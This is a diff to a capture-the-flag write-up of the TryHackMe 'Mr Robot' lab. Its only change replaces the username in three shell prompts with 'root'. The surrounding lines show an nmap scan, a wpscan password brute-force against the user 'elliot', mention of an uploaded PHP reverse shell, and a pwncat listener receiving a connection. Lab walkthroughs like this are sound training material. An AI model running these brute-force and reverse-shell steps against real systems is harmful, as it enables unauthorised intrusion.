@@ -30,7 +30,7 @@ There is dirty cow exploit and another is through nmap.
 ### Enumeration
 
 ```bash
-┌─[argenestel@parrot]─[~/Desktop/tryhackme/robotctf]
+┌─[root@parrot]─[~/Desktop/tryhackme/robotctf]
 └──╼ $nmap -sC -sV -oN nmap/robot 10.10.183.108
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-21 12:11 IST
 Nmap scan report for 10.10.183.108
@@ -116,7 +116,7 @@ so i got ~11000 lines ahh not bad let's start wpscan.
 so we are now going to upload a reverse shell.
 
 ```bash
-┌─[argenestel@parrot]─[~/Desktop/tryhackme/robotctf]
+┌─[root@parrot]─[~/Desktop/tryhackme/robotctf]
 └──╼ $wpscan --url http://mrrobot.thm -P uniq.list --usernames elliot
 _______________________________________________________________
          __          _______   _____
@@ -224,7 +224,7 @@ uploaded php shell let's execute it
 we have pwncat listening.
 
 ```bash
-┌─[argenestel@parrot]─[~/Desktop/tryhackme/robotctf]
+┌─[root@parrot]─[~/Desktop/tryhackme/robotctf]
 └──╼ $pwncat --listen --port 1234
 [15:37:16] received connection from 10.10.239.89:51343                                                     connect.py:148
 [15:37:18] new host w/ hash 243b586998c75238b33cb10b9ad0ab52                                                victim.py:325
